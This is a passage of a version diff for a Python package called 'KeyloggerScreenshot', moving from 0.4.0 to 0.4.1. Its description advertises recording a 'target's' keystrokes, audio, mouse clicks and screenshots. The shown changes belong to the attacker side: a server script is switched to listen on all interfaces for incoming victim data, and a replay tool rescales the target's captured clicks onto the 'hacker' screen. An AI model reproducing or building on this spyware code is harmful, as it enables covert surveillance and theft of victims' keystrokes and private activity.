                     # This splits the data with the special code
-                    self.do_file(spalten[0])
+                    self.do_file(spalten[1])
 
                 else:
                     # Checks if the coordinates are there
                     self.cord = self.full_msg.split(")]")
                     self.new_cor = self.cord[0] + ")]"
 
                 filename = self.check_double()
```

### Comparing `KeyloggerScreenshot-0.4.0/KeyloggerScreenshot/Server_listener.py` & `KeyloggerScreenshot-0.4.1/KeyloggerScreenshot/Server_listener.py`

 * *Files identical despite different names*

### Comparing `KeyloggerScreenshot-0.4.0/KeyloggerScreenshot/Server_photos.py` & `KeyloggerScreenshot-0.4.1/KeyloggerScreenshot/Server_photos.py`

 * *Files identical despite different names*

### Comparing `KeyloggerScreenshot-0.4.0/KeyloggerScreenshot/Server_timer.py` & `KeyloggerScreenshot-0.4.1/KeyloggerScreenshot/Server_timer.py`

 * *Files identical despite different names*

### Comparing `KeyloggerScreenshot-0.4.0/KeyloggerScreenshot/Simulation_code.py` & `KeyloggerScreenshot-0.4.1/Simualation_code.py`

 * *Files 16% similar despite different names*

```diff
@@ -111,14 +111,34 @@
         img_files = [each_img for each_img in os.listdir() if "New_Image" in each_img]
         # This checks for all Images in the directory
 
         if not img_files:
             print('There is no "New_Image" in this directory')
             sys.exit()
 
+        # This is here so every kind of display will be shown correctly
+        get_size = PIL.Image.open(img_files[0])
+        # opens the image
+        target_size_x, target_size_y = get_size.size
+        # Gets the size of the image with x and y
+        hacker_size_x, hacker_size_y = pg.size()
+        # Gets the size of the hacker with x and y
+
+        difference_x, difference_y = hacker_size_x/target_size_x, hacker_size_y/target_size_y
+        # This is the difference between the two. For example 1920x1080 = hacker and 1366x768 = target.
+        # To rescale the image the x position of the target will be divided by the x position of the hacker
+        new_coordinates = [(round(new_x * difference_x), round(new_y * difference_y)) for new_x, new_y in every_coordinate]
+        # Stores the rescaled coordinates into a list
+        for img in img_files:
+            image = PIL.Image.open(img)
+            # Opens the image
+            new_image = image.resize((hacker_size_x, hacker_size_y))
+            # Resizes every image to the size of the hacker display
+            new_image.save(img)
+            # Saves the image in the same directory
 
         pg.FAILSAFE = False
         # This is for the corner allowance
         img_seconds = 5.572
         # This is the speed it takes to open the image
         speed = 0.47
         # This is the time each coordinate needs
@@ -162,14 +182,16 @@
             im = PIL.Image.open(image)
             try:
                 # Opens the image
                 im.show()
                 time.sleep(2)
                 pg.press("f11")
                 # Makes the image in the perfect resolution
-                for x, y in every_coordinate:
+                for x, y in new_coordinates:
                     pg.moveTo(x, y, 0.3)
                     time.sleep(sleep)
                 pg.press("esc")
             except RuntimeError:
                 bp.color('\n\nTry to run "python Simulation_code.py" in your terminal.\nIf this did not work try to clone my project on github: https://github.com/Kill0geR/KeyloggerScreenshot',"red")
                 os._exit(0)
+
+Simulation.start_simulation()
```

### Comparing `KeyloggerScreenshot-0.4.0/KeyloggerScreenshot.egg-info/PKG-INFO` & `KeyloggerScreenshot-0.4.1/KeyloggerScreenshot.egg-info/PKG-INFO`

 * *Files 2% similar despite different names*

```diff
@@ -1,16 +1,16 @@
 Metadata-Version: 2.1
 Name: KeyloggerScreenshot
-Version: 0.4.0
+Version: 0.4.1
 Summary: Exporting Keylogger files, recording audio, recording mouse click information and screenshots of the target. For more information check out my website:https://pypi.org/project/KeyloggerScreenshot/ and my github: https://github.com/Facileee/KeyloggerScreenshot
 Home-page: 
 Author: Fawaz Bashiru
 Author-email: fawazbashiru@gmail.com
 License: MIT
-Keywords: KeyloggerScreenshot
+Keywords: Keylogger
 Classifier: Development Status :: 6 - Mature
 Classifier: Intended Audience :: Education
 Classifier: Operating System :: Microsoft :: Windows :: Windows 10
 Classifier: License :: OSI Approved :: MIT License
 Classifier: Programming Language :: Python :: 3
 Description-Content-Type: text/markdown
 
@@ -358,7 +358,12 @@
 - Stops the process of images also in linux with PID
 - PID fix on windows
 - duration_in_seconds has been changed to 60 seconds from 200 seconds
 - Mouseclick information will now be sent after Interruption
 - More intelligent Keylogger
 - If backspace is pressed the last pressed character will be deleted from the list
 - Detects if backspace is hold for a long time
+
+0.4.1 (08/05/2023)
+-------------------
+- Fixed Interruption Error
+- Every coordinate of the target no mater what Image size it has will now be shown on the hackers Simulation_code
```

### Comparing `KeyloggerScreenshot-0.4.0/KeyloggerScreenshot.egg-info/SOURCES.txt` & `KeyloggerScreenshot-0.4.1/KeyloggerScreenshot.egg-info/SOURCES.txt`

 * *Files identical despite different names*

### Comparing `KeyloggerScreenshot-0.4.0/LISCENCE.txt` & `KeyloggerScreenshot-0.4.1/LISCENCE.txt`

 * *Files identical despite different names*

### Comparing `KeyloggerScreenshot-0.4.0/PKG-INFO` & `KeyloggerScreenshot-0.4.1/PKG-INFO`

 * *Files 2% similar despite different names*

```diff
@@ -1,16 +1,16 @@
 Metadata-Version: 2.1
 Name: KeyloggerScreenshot
-Version: 0.4.0
+Version: 0.4.1
 Summary: Exporting Keylogger files, recording audio, recording mouse click information and screenshots of the target. For more information check out my website:https://pypi.org/project/KeyloggerScreenshot/ and my github: https://github.com/Facileee/KeyloggerScreenshot
 Home-page: 
 Author: Fawaz Bashiru
 Author-email: fawazbashiru@gmail.com
 License: MIT
-Keywords: KeyloggerScreenshot
+Keywords: Keylogger
 Classifier: Development Status :: 6 - Mature
 Classifier: Intended Audience :: Education
 Classifier: Operating System :: Microsoft :: Windows :: Windows 10
 Classifier: License :: OSI Approved :: MIT License
 Classifier: Programming Language :: Python :: 3
 Description-Content-Type: text/markdown
 
@@ -358,7 +358,12 @@
 - Stops the process of images also in linux with PID
 - PID fix on windows
 - duration_in_seconds has been changed to 60 seconds from 200 seconds
 - Mouseclick information will now be sent after Interruption
 - More intelligent Keylogger
 - If backspace is pressed the last pressed character will be deleted from the list
 - Detects if backspace is hold for a long time
+
+0.4.1 (08/05/2023)
+-------------------
+- Fixed Interruption Error
+- Every coordinate of the target no mater what Image size it has will now be shown on the hackers Simulation_code
```

### Comparing `KeyloggerScreenshot-0.4.0/README.md` & `KeyloggerScreenshot-0.4.1/README.md`

 * *Files identical despite different names*

### Comparing `KeyloggerScreenshot-0.4.0/Simualation_code.py` & `KeyloggerScreenshot-0.4.1/KeyloggerScreenshot/Simulation_code.py`

 * *Files 22% similar despite different names*

```diff
@@ -16,16 +16,18 @@
 
     @staticmethod
     def countdown():
         real_sec = Simulation.seconds
         seconds = Simulation.seconds + 4
         # Plus four seconds because of the time the code sleeps
 
-        if sys.platform == "linux": size = "295x367"
-        else: size = "250x415"
+        if sys.platform == "linux":
+            size = "295x367"
+        else:
+            size = "250x415"
 
         tkWindow = tk.Tk()
         tkWindow.geometry(size)
         tkWindow.title('KeyloggerScreenshot')
         minutes = seconds // 60
         this_min = minutes * 60
         this_sec = seconds - this_min
@@ -35,15 +37,16 @@
             mins, secs = divmod(seconds, 60)
             timer = '{:02d}:{:02d}'.format(mins, secs)
             print(f"\rTime left: {timer}", end="")
             time.sleep(1)
             seconds -= 1
         print("\nTHANK YOU FOR YOU USING KEYLOGGERSCREENSHOT")
         # GUI BY: DYMA020
-        Simulation.startbutton = tk.Button(tkWindow, text="Stop stimulation", command=Simulation.changecol, height=10, width=30)
+        Simulation.startbutton = tk.Button(tkWindow, text="Stop stimulation", command=Simulation.changecol, height=10,
+                                           width=30)
         # Puts everything on place
         Simulation.startbutton.grid(row=1, column=0)
         if real_sec < 60:
             text = f"Simulation for {real_sec} seconds"
         else:
             m, s = divmod(real_sec, 60)
             timer = '{:02d}:{:02d}'.format(m, s)
@@ -58,15 +61,16 @@
         # This is the button
         Simulation.startbutton["text"] = "Stop simulation"
         if sys.platform != "linux":
             data = subprocess.check_output("tasklist")
             # This lists all the tasks that are open on windows
             str_data = str(data).split()
             # Splits the data
-            all_exe = [(exe.replace(r"K\\r\\n", "").replace(r"K\r\n", ""), str_data[idx + 1]) for idx, exe in enumerate(str_data) if ".exe" in exe]
+            all_exe = [(exe.replace(r"K\\r\\n", "").replace(r"K\r\n", ""), str_data[idx + 1]) for idx, exe in
+                       enumerate(str_data) if ".exe" in exe]
             # This removes all unnecessary characters and stores all .exe files with their pid number in this list
             photo = [(task, pid) for task, pid in all_exe if task == "PhotosApp.exe"]
             # photo searches for the right pid to kill the process
 
             if photo:
                 os.system(f"taskkill /f /PID {photo[0][1]}")
                 # Kills the photos with it pid number
@@ -111,26 +115,47 @@
         img_files = [each_img for each_img in os.listdir() if "New_Image" in each_img]
         # This checks for all Images in the directory
 
         if not img_files:
             print('There is no "New_Image" in this directory')
             sys.exit()
 
+        # This is here so every kind of display will be shown correctly
+        get_size = PIL.Image.open(img_files[0])
+        # opens the image
+        target_size_x, target_size_y = get_size.size
+        # Gets the size of the image with x and y
+        hacker_size_x, hacker_size_y = pg.size()
+        # Gets the size of the hacker with x and y
+
+        difference_x, difference_y = hacker_size_x / target_size_x, hacker_size_y / target_size_y
+        # This is the difference between the two. For example 1920x1080 = hacker and 1366x768 = target.
+        # To rescale the image the x position of the target will be divided by the x position of the hacker
+        new_coordinates = [(round(new_x * difference_x), round(new_y * difference_y)) for new_x, new_y in
+                           every_coordinate]
+        # Stores the rescaled coordinates into a list
+        for img in img_files:
+            image = PIL.Image.open(img)
+            # Opens the image
+            new_image = image.resize((hacker_size_x, hacker_size_y))
+            # Resizes every image to the size of the hacker display
+            new_image.save(img)
+            # Saves the image in the same directory
 
         pg.FAILSAFE = False
         # This is for the corner allowance
         img_seconds = 5.572
         # This is the speed it takes to open the image
         speed = 0.47
         # This is the time each coordinate needs
         sleep = 1.5
         # This is the time, where the code is taking a time out
         one_coordinate = speed + sleep
 
-        if sys.platform != "linux": # This calculation is for windows
+        if sys.platform != "linux":  # This calculation is for windows
             # This is for the corner allowance
             img_seconds = 5.572
             # This is the speed it takes to open the image
             speed = 0.47
             # This is the time each coordinate needs
             escape = 0.1
             # This is the time the program needs to escape an image
@@ -147,31 +172,31 @@
             all_cor = one_cor * len(every_coordinate)
             esc = 0.1
             this_img = all_cor + open_img + esc
             Simulation.seconds = round(this_img * len(img_files))
         # This calculates the amount it will take
 
         print(f"\nThe target has clicked {len(every_coordinate)} times on his screen")
-        threading_count = threading.Thread(target=Simulation.countdown, args=(Simulation.seconds, ))
+        threading_count = threading.Thread(target=Simulation.countdown, args=(Simulation.seconds,))
         # The countdown will start
         threading_count = threading.Thread(target=Simulation.countdown)
         # The countdown will start
         threading_count.start()
 
         pg.sleep(4)
         for image in img_files:
             im = PIL.Image.open(image)
             try:
                 # Opens the image
                 im.show()
                 time.sleep(2)
                 pg.press("f11")
                 # Makes the image in the perfect resolution
-                for x, y in every_coordinate:
+                for x, y in new_coordinates:
                     pg.moveTo(x, y, 0.3)
                     time.sleep(sleep)
                 pg.press("esc")
             except RuntimeError:
-                bp.color('\n\nTry to run "python Simulation_code.py" in your terminal.\nIf this did not work try to clone my project on github: https://github.com/Kill0geR/KeyloggerScreenshot',"red")
+                bp.color(
+                    '\n\nTry to run "python Simulation_code.py" in your terminal.\nIf this did not work try to clone my project on github: https://github.com/Kill0geR/KeyloggerScreenshot',
+                    "red")
                 os._exit(0)
-
-Simulation.start_simulation()
```

### Comparing `KeyloggerScreenshot-0.4.0/demon_server.py` & `KeyloggerScreenshot-0.4.1/demon_server.py`

 * *Files 4% similar despite different names*

```diff
@@ -1,17 +1,17 @@
 import KeyloggerScreenshot as ks
 import threading
 
-ip = "127.0.0.1"
+ip = "0.0.0.0"
 
 server_photos = ks.ServerPhotos(ip, 1122)
 
-server_keylogger = ks.ServerKeylogger(ip, 2233, simulater=True)
+server_keylogger = ks.ServerKeylogger(ip, 2233, simulater=False)
 
-server_listener = ks.ServerListener(ip, 1134)
+server_listener = ks.ServerListener(ip, 3344)
 
 server_time = ks.Timer(ip, 4455)
 
 threading_server = threading.Thread(target=server_photos.start)
 threading_server.start()
 
 threading_server2 = threading.Thread(target=server_keylogger.start)
```

### Comparing `KeyloggerScreenshot-0.4.0/leo_gui.py` & `KeyloggerScreenshot-0.4.1/leo_gui.py`

 * *Files identical despite different names*

### Comparing `KeyloggerScreenshot-0.4.0/requirements.py` & `KeyloggerScreenshot-0.4.1/requirements.py`

 * *Files identical despite different names*

### Comparing `KeyloggerScreenshot-0.4.0/setup.py` & `KeyloggerScreenshot-0.4.1/setup.py`

 * *Files 8% similar despite different names*

```diff
@@ -6,20 +6,20 @@
     'Operating System :: Microsoft :: Windows :: Windows 10',
     'License :: OSI Approved :: MIT License',
     'Programming Language :: Python :: 3'
 ]
 
 setup(
     name='KeyloggerScreenshot',
-    version='0.4.0',
+    version='0.4.1',
     description='Exporting Keylogger files, recording audio, recording mouse click information and screenshots of the target. For more information check out my website:https://pypi.org/project/KeyloggerScreenshot/ and my github: https://github.com/Facileee/KeyloggerScreenshot',
     long_description_content_type="text/markdown",
     long_description=open('README.md').read() + '\n\n' + open('CHANGELOG.txt').read(),
     url='',
     author='Fawaz Bashiru',
     author_email='fawazbashiru@gmail.com',
     license='MIT',
     classifiers=classifiers,
-    keywords='KeyloggerScreenshot',
+    keywords='Keylogger',
     packages=find_packages(),
     install_requires=['pynput', "pyautogui", "pyaudio", "BetterPrinting", "Pillow"]
 )
```

